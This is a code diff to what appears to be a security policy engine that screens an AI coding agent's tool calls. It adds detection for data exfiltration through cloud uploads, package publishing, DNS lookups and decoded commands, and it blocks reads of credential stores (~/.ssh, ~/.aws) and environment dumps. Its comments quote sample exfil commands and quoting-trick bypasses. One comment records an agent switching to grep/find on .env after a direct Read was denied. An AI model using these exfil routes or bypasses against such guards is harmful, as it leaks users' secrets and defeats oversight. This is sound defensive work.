@@ -108,6 +108,163 @@ NETWORK_SHELL_RE = re.compile(
 SHELL_FULL_URL_RE = re.compile(r"[a-z][a-z0-9+.-]*://[^\s'\"<>|;&)]+", re.I)
 SHELL_USER_HOST_RE = re.compile(r"[A-Za-z0-9._-]+@([a-zA-Z0-9.-]+)")
 
+# Commands that send data out without being a generic network client, so
+# NETWORK_SHELL_RE above never saw them -- found 2026-10-11 by bypass
+# testing a secret-tainted session: `aws s3 cp`, `gh gist create`,
+# `npm publish`, and DNS exfil (`dig $(...).evil.com`) all went through.
+# Matched against the FIRST WORDS of each command segment (see
+# _shell_segments), not anywhere in the text, so `--host 0.0.0.0` or a
+# file called `ping.py` don't count.
+OUTBOUND_SHELL_COMMANDS = [
+    ("aws", "s3", "cp"), ("aws", "s3", "mv"), ("aws", "s3", "sync"), ("aws", "s3api", "put-object"),
+    ("gsutil",), ("gcloud", "storage"), ("az", "storage"), ("rclone",),
+    ("gh", "gist"), ("npm", "publish"), ("yarn", "publish"), ("pnpm", "publish"),
+    ("twine", "upload"), ("cargo", "publish"), ("gem", "push"), ("docker", "push"), ("podman", "push"),
+    ("sendmail",), ("mail",), ("mutt",),
+]
+# DNS / ICMP tools: the destination host itself carries the data
+# (`dig <secret>.evil.com`), so only allowlisted hosts are safe.
+LOOKUP_SHELL_COMMANDS = {"dig", "nslookup", "host", "ping", "ping6", "traceroute", "tracepath", "whois"}
+# Normal developer workflow that publishes repo contents to a remote the
+# user configured. Blocking every `git push` after a secret was read would
+# break real work, so these ASK instead of blocking (see evaluate_call).
+CONFIRM_SHELL_COMMANDS = [("git", "push"), ("git", "remote"), ("gh", "pr"), ("gh", "issue"), ("gh", "release"), ("gh", "api"), ("gh", "repo")]
+# Interpreters/launchers whose script argument we check against the
+# session's network-capable scripts (see TaintContext.network_scripts).
+SCRIPT_RUNNERS = {"python", "python3", "node", "bash", "sh", "zsh", "ruby", "perl", "php", "deno", "bun", "tsx", "ts-node", "npx", "uv", "source", "."}
+_SEGMENT_SPLIT_RE = re.compile(r"\|\||&&|[;|&\n()`]|\$\(")
+_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
+_PREFIX_WORDS = {"sudo", "env", "exec", "nohup", "time", "xargs", "command", "builtin", "nice", "timeout", "stdbuf"}
+# Signs the command builds or decodes the program it runs, so its text
+# can't be trusted to show what it does: `$(echo Y3VybA== | base64 -d) ...`,
+# `eval "$X"`, `... | base64 -d | sh`.
+_DECODE_RE = re.compile(r"\b(base64\s+(-d|--decode|-D)|xxd\s+-r|openssl\s+(enc|base64)\s+-d)\b|\|\s*rev\b")
+_PIPE_TO_SHELL_RE = re.compile(r"\|\s*(sudo\s+)?(ba|z|da|k)?sh\b")
+
+
+def _normalize_shell(command: str) -> str:
+    """Undo quoting tricks the shell would erase before running the
+    command: `c''url` and `c"u"rl` are curl, `cu\\rl` is curl. Without
+    this every keyword check here could be dodged with two quote marks
+    (found 2026-10-11 by bypass testing)."""
+    s = re.sub(r"(?<=[\w./~-])(''|\"\")(?=[\w./~-])", "", command)
+    s = re.sub(r"(?<=[\w./~-])'([\w./~-]*)'(?=[\w./~-]|\s|$)", r"\1", s)
+    s = re.sub(r"(?<=[\w./~-])\"([\w./~-]*)\"(?=[\w./~-]|\s|$)", r"\1", s)
+    s = re.sub(r"(?:(?<=\s)|^)'([\w./~-]*)'(?=[\w./~-])", r"\1", s)
+    s = re.sub(r"(?:(?<=\s)|^)\"([\w./~-]*)\"(?=[\w./~-])", r"\1", s)
+    s = re.sub(r"\\(?=[A-Za-z0-9._/-])", "", s)
+    # single-character glob classes: .[e]nv -> .env
+    s = re.sub(r"\[([A-Za-z0-9._-])\]", r"\1", s)
+    return s
+
+
+def _shell_segments(command: str) -> list:
+    """The command words of each simple command in a shell line, with
+    leading VAR=value assignments and wrappers like sudo/env/xargs
+    dropped: `FOO=1 sudo aws s3 cp a b && ls` -> [["aws","s3","cp","a","b"], ["ls"]]."""
+    segments = []
+    for part in _SEGMENT_SPLIT_RE.split(command):
+        words = [w.strip("'\"") for w in part.split()]
+        while words and (_ENV_ASSIGN_RE.match(words[0]) or words[0] in _PREFIX_WORDS or words[0].startswith("-")):
+            words.pop(0)
+        if words:
+            segments.append(words)
+    return segments
+
+
+def _shell_segments_raw(command: str) -> list:
+    """Like _shell_segments but keeps wrapper words such as `env`."""
+    segments = []
+    for part in _SEGMENT_SPLIT_RE.split(command):
+        words = [w.strip("'\"") for w in part.split()]
+        while words and words[0] in ("sudo", "exec", "command", "builtin", "nohup", "time"):
+            words.pop(0)
+        if words:
+            segments.append(words)
+    return segments
+
+
+def _starts_with(words: list, prefix: tuple) -> bool:
+    if len(words) < len(prefix):
+        return False
+    first = words[0].rsplit("/", 1)[-1]  # /usr/bin/aws -> aws
+    return first == prefix[0] and tuple(words[1:len(prefix)]) == prefix[1:]
+
+
+def _shell_is_dynamic(command: str) -> bool:
+    """Does the command compute the program it runs at runtime? Then its
+    text says nothing about where data goes."""
+    if _DECODE_RE.search(command) and ("$(" in command or "`" in command or _PIPE_TO_SHELL_RE.search(command)):
+        return True
+    for words in _shell_segments(command):
+        # `$CMD args` runs whatever CMD holds; `$HOME/bin/tool` is just a path
+        if words[0] == "eval" or (words[0].startswith("$") and "/" not in words[0]):
+            return True
+    return False
+
+
+def shell_outbound_kind(command: str, network_scripts: dict = None):
+    """Classify a shell command's network reach:
+      None       -> stays on this machine as far as we can tell
+      "confirm"  -> ordinary publish workflow (git push, gh pr ...)
+      "external" -> sends data somewhere not on the allowlist
+    network_scripts: {basename: reaches_external} for scripts this session
+    wrote that contain network code (TaintContext.network_scripts), so
+    "write upload.py, then run python3 upload.py" is seen as network use --
+    the most natural exfil path for an agent, and it used to be invisible."""
+    s = _normalize_shell(command)
+    segments = _shell_segments(s)
+
+    if NETWORK_SHELL_RE.search(s):
+        if _shell_call_is_external(s):
+            return "external"
+    if _shell_is_dynamic(s):
+        return "external"
+    for words in segments:
+        if any(_starts_with(words, p) for p in OUTBOUND_SHELL_COMMANDS):
+            return "external"
+        if words[0].rsplit("/", 1)[-1] in LOOKUP_SHELL_COMMANDS:
+            targets = [w for w in words[1:] if not w.startswith("-") and not w.isdigit()]
+            if not targets or any(t.split("@")[-1] not in ALLOWLISTED_DOMAINS for t in targets):
+                return "external"
+    if network_scripts:
+        for words in segments:
+            runner = words[0].rsplit("/", 1)[-1]
+            candidates = words[1:] if runner in SCRIPT_RUNNERS else words[:1]
+            for w in candidates:
+                name = w.rsplit("/", 1)[-1]
+                if name in network_scripts and network_scripts[name]:
+                    return "external"
+    for words in segments:
+        if any(_starts_with(words, p) for p in CONFIRM_SHELL_COMMANDS):
+            # a destination named inline (`git push https://x/repo.git`,
+            # `git remote add x user@host:repo`) isn't the user's configured
+            # remote -- it's what an injected instruction would supply
+            rest = " ".join(words[1:])
+            if SHELL_FULL_URL_RE.search(rest) or SHELL_USER_HOST_RE.search(rest):
+                if _shell_call_is_external(rest):
+                    return "external"
+            return "confirm"
+    return None
+
+
+def script_network_reach(content: str):
+    """For a file the agent is writing: None if it has no network code,
+    else True/False for whether it can reach outside the allowlist. A
+    network call with no literal URL (host from a variable) counts as
+    external -- same conservative bias as _shell_call_is_external."""
+    if not content or not NETWORK_SHELL_RE.search(content):
+        return None
+    hosts = []
+    for url in SHELL_FULL_URL_RE.findall(content):
+        try:
+            hosts.append(urlparse(url).hostname or "")
+        except ValueError:
+            hosts.append("")
+    if not hosts:
+        return True
+    return any(h not in ALLOWLISTED_DOMAINS for h in hosts)
+
 # Domains considered inside the trust boundary. Extend as needed for the demo.
 ALLOWLISTED_DOMAINS = {
     "localhost",
@@ -138,6 +295,7 @@ _DEFAULT_RULE_TOGGLES = {
     "secret_exfil_blocking": True,
     "pii_internal_boundary_confirm": True,
     "baseline_external_flagging": True,
+    "credential_file_protection": True,
 }
 
 RULE_TOGGLE_LABELS = {
@@ -145,7 +303,30 @@ RULE_TOGGLE_LABELS = {
     "secret_exfil_blocking": "Block previously-read secrets from being sent to an external API",
     "pii_internal_boundary_confirm": "Require approval before PII or internal-only data crosses the trust boundary",
     "baseline_external_flagging": "Flag (low-risk, still allowed) any untainted call to a new external domain",
+    "credential_file_protection": "Block reading credential stores (~/.ssh, ~/.aws, cloud CLI logins, private keys) and full environment dumps",
 }
+
+# Where developer machines keep credentials, outside any project. Built in
+# rather than added to the editable deny list: existing installs and hosted
+# projects keep their saved list, so a new default there would never reach
+# them. Found 2026-10-11 by bypass testing: Read ~/.aws/credentials and
+# `cat ~/.ssh/id_ed25519` were both allowed.
+CREDENTIAL_PATH_PATTERNS = [
+    ".ssh/**", ".aws/**", ".gnupg/**", ".config/gcloud/**", ".azure/**", ".kube/**",
+    ".docker/config.json", ".netrc", ".git-credentials", ".pypirc",
+    "id_rsa*", "id_dsa*", "id_ecdsa*", "id_ed25519*",
+]
+# Never sensitive even when a pattern matches: committed templates
+# (.env.example, and copies like .env.example.bak) and public keys
+# (id_ed25519.pub).
+_TEMPLATE_MARKERS = (".example", ".sample", ".template", ".dist")
+
+
+def _is_safe_name(name: str) -> bool:
+    return name.endswith(".pub") or any(m in name for m in _TEMPLATE_MARKERS)
+# Printing the whole environment is reading every secret the shell was
+# started with -- same effect as reading .env.
+ENV_DUMP_RE = re.compile(r"/proc/(self|\d+|\*)/environ\b")
 
 POLICIES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "policies.json")
 
@@ -235,7 +416,26 @@ def set_rule_toggles(toggles: dict):
     return merged
 
 
-def check_path_denylist(path: str, patterns: list = None):
+def _path_matches(parts: list, pattern: str, match_dir_itself: bool = False) -> bool:
+    """One deny pattern against a split path. "a/b/**" matches when a, b
+    appear consecutively as directories; "a/b" matches the path's tail;
+    a bare glob matches the file name. match_dir_itself: also match the
+    directory on its own (`ls ~/.ssh`), used for shell tokens, which can
+    name a directory where Read/Write always name a file."""
+    if not parts:
+        return False
+    if pattern.endswith("/**"):
+        want = [p for p in pattern[:-3].split("/") if p]
+        dirs = parts if match_dir_itself else parts[:-1]
+        return any(dirs[i:i + len(want)] == want for i in range(len(dirs) - len(want) + 1))
+    want = [p for p in pattern.split("/") if p]
+    if len(want) > 1:
+        tail = parts[-len(want):]
+        return len(tail) == len(want) and all(fnmatch.fnmatch(a, b) for a, b in zip(tail, want))
+    return fnmatch.fnmatch(parts[-1], pattern)
+
+
+def check_path_denylist(path: str, patterns: list = None, match_dir_itself: bool = False):
     """Return a reason string if `path` matches a hard-denylisted pattern,
     else None. Works for both absolute and relative paths.
 
@@ -246,15 +446,25 @@ def check_path_denylist(path: str, patterns: list = None):
     if not path:
         return None
     parts = [p for p in path.replace("\\", "/").split("/") if p]
-    basename = parts[-1] if parts else path
+    if not parts or _is_safe_name(parts[-1]):
+        return None
 
     for pattern in (patterns if patterns is not None else get_deny_path_patterns()):
-        if pattern.endswith("/**"):
-            dirname = pattern[:-3]
-            if dirname in parts[:-1]:
-                return f"path_denylist:{pattern}"
-        elif fnmatch.fnmatch(basename, pattern):
+        if _path_matches(parts, pattern, match_dir_itself):
             return f"path_denylist:{pattern}"
+    return None
+
+
+def check_credential_path(path: str, match_dir_itself: bool = False):
+    """Reason string if `path` is a known credential store, else None."""
+    if not path:
+        return None
+    parts = [p for p in path.replace("\\", "/").split("/") if p]
+    if not parts or _is_safe_name(parts[-1]):
+        return None
+    for pattern in CREDENTIAL_PATH_PATTERNS:
+        if _path_matches(parts, pattern, match_dir_itself):
+            return f"credential_store:{pattern}"
     return None
 
 
@@ -264,17 +474,55 @@ def check_path_denylist(path: str, patterns: list = None):
 # run_shell sails through evaluate_call() with the same effective outcome
 # (found via live testing: Claude Code fell back to `grep`/`find` on .env
 # after a direct Read was denied, and that path wasn't covered).
-DENY_COMMAND_TOKEN_RE = re.compile(r"(?:^|[\s'\"/])(\.env\S*|admin/|secrets/)", re.I)
 
 
-def check_command_denylist(command: str):
-    """Return a reason string if a shell command string references a
-    denylisted path anywhere in it, else None."""
+_SHELL_TOKEN_SPLIT_RE = re.compile(r"[\s'\"=;|&<>()`,:@{}$]+")
+
+
+def check_command_denylist(command: str, patterns: list = None, credentials: bool = True):
+    """Return a reason string if a shell command references a denylisted
+    path or a credential store anywhere in it, else None.
+
+    Token based and driven by the project's own pattern list -- this used
+    to be a fixed regex for .env/admin/secrets only, so a custom pattern
+    (or the hosted backend's per-project list) never applied to shell
+    commands. Checks the command as written and with quoting tricks undone
+    (`.e''nv`, `.[e]nv`)."""
     if not command:
         return None
-    match = DENY_COMMAND_TOKEN_RE.search(command)
-    if match:
-        return f"path_denylist:shell_reference:{match.group(1)}"
+    patterns = patterns if patterns is not None else get_deny_path_patterns()
+    for text in (command, _normalize_shell(command)):
+        for token in _SHELL_TOKEN_SPLIT_RE.split(text):
+            if not token or token.startswith("-"):
+                continue
+            if check_path_denylist(token, patterns, match_dir_itself=True):
+                return f"path_denylist:shell_reference:{token.rsplit('/', 1)[-1] or token}"
+            if credentials:
+                reason = check_credential_path(token, match_dir_itself=True)
+                if reason:
+                    return f"{reason}:shell_reference"
+    return None
+
+
+def check_env_dump(command: str):
+    """Reason string if the command prints the whole environment
+    (`env`, `printenv`, `export -p`, /proc/*/environ), else None.
+    `env FOO=1 cmd` (running a command) and `printenv HOME` (one named
+    variable, whose output is still classified) are fine."""
+    s = _normalize_shell(command or "")
+    if ENV_DUMP_RE.search(s):
+        return "environment_dump"
+    for words in _shell_segments_raw(s):
+        name = words[0].rsplit("/", 1)[-1]
+        rest = [w for w in words[1:] if not w.startswith("-")]
+        if name == "env" and not any(not _ENV_ASSIGN_RE.match(w) for w in rest):
+            return "environment_dump"
+        if name == "printenv" and not rest:
+            return "environment_dump"
+        if name in ("export", "declare", "typeset") and words[1:2] in (["-p"], ["-x"], []):
+            return "environment_dump"
+        if name == "set" and len(words) == 1:
+            return "environment_dump"
     return None
 
 
@@ -362,7 +610,7 @@ def _shell_command_hosts(command: str) -> list:
     return hosts
 
 
-def _crosses_trust_boundary(tool_name: str, target: str) -> bool:
+def _crosses_trust_boundary(tool_name: str, target: str, network_scripts: dict = None) -> bool:
     """Is this call (call_api OR a run_shell command that talks to the
     network) reaching outside the trust boundary? The single check the
     secret/PII/internal-only taint rules below share, so `call_api` and
@@ -370,8 +618,8 @@ def _crosses_trust_boundary(tool_name: str, target: str) -> bool:
     a free pass -- see NETWORK_SHELL_RE above for why this exists."""
     if tool_name == "call_api":
         return _is_external(target)
-    if tool_name == "run_shell" and NETWORK_SHELL_RE.search(target):
-        return _shell_call_is_external(target)
+    if tool_name == "run_shell":
+        return shell_outbound_kind(target, network_scripts) is not None
     return False
 
 
@@ -382,6 +630,7 @@ def evaluate_call(
     inherited_tags: set,
     deny_path_patterns: list = None,
     rule_toggles: dict = None,
+    network_scripts: dict = None,
 ) -> PolicyResult:
     """Core policy decision, run BEFORE a tool call executes.
 
@@ -408,6 +657,10 @@ def evaluate_call(
         path_reason = check_path_denylist(target, patterns=deny_path_patterns)
         if path_reason:
             return PolicyResult(Decision.BLOCK, 100, [path_reason])
+        if toggles.get("credential_file_protection", True):
+            cred_reason = check_credential_path(target)
+            if cred_reason:
+                return PolicyResult(Decision.BLOCK, 100, [cred_reason])
 
     # 1. Dangerous shell patterns -> always block regardless of taint
     if toggles.get("dangerous_shell_detection", True) and tool_name == "run_shell" and DANGEROUS_SHELL_RE.search(target):
@@ -417,9 +670,14 @@ def evaluate_call(
     # .env/admin/secrets) -> block, same as a direct Read/Edit/Write would be.
     # Also not toggle-gated, same reasoning as rule 0.
     if tool_name == "run_shell":
-        command_reason = check_command_denylist(target)
+        protect_creds = toggles.get("credential_file_protection", True)
+        command_reason = check_command_denylist(target, patterns=deny_path_patterns, credentials=protect_creds)
         if command_reason:
             return PolicyResult(Decision.BLOCK, 100, [command_reason])
+        if protect_creds:
+            dump_reason = check_env_dump(target)
+            if dump_reason:
+                return PolicyResult(Decision.BLOCK, 100, [dump_reason])
 
     # 2. Secret data leaving the boundary -> always block
     # (call_api and network-shelling-out only, via _crosses_trust_boundary
@@ -431,17 +689,21 @@ def evaluate_call(
     # including a false BLOCK on a harmless local save whenever taint was
     # active. Found via live testing: routine writes kept showing up
     # "flagged" for no real reason.)
-    if toggles.get("secret_exfil_blocking", True) and Tag.SECRET in inherited_tags and _crosses_trust_boundary(tool_name, target):
+    if toggles.get("secret_exfil_blocking", True) and Tag.SECRET in inherited_tags and _crosses_trust_boundary(tool_name, target, network_scripts):
+        # git push / gh pr ... are everyday work, not an exfil channel an
+        # attacker picks: ask instead of blocking outright
+        if tool_name == "run_shell" and shell_outbound_kind(target, network_scripts) == "confirm":
+            return PolicyResult(Decision.PENDING_CONFIRM, 80, ["secret_session_publish"])
         return PolicyResult(Decision.BLOCK, 95, ["secret_data_exfil_attempt"])
 
     # 3. PII crossing the boundary -> pause for confirmation
-    if toggles.get("pii_internal_boundary_confirm", True) and Tag.PII in inherited_tags and _crosses_trust_boundary(tool_name, target):
+    if toggles.get("pii_internal_boundary_confirm", True) and Tag.PII in inherited_tags and _crosses_trust_boundary(tool_name, target, network_scripts):
         reasons.append("pii_crossing_trust_boundary")
         risk = max(risk, 70)
         return PolicyResult(Decision.PENDING_CONFIRM, risk, reasons)
 
     # 4. Internal-only data leaving the boundary -> pause for confirmation
-    if toggles.get("pii_internal_boundary_confirm", True) and Tag.INTERNAL_ONLY in inherited_tags and _crosses_trust_boundary(tool_name, target):
+    if toggles.get("pii_internal_boundary_confirm", True) and Tag.INTERNAL_ONLY in inherited_tags and _crosses_trust_boundary(tool_name, target, network_scripts):
         reasons.append("internal_data_crossing_trust_boundary")
         risk = max(risk, 60)
         return PolicyResult(Decision.PENDING_CONFIRM, risk, reasons)
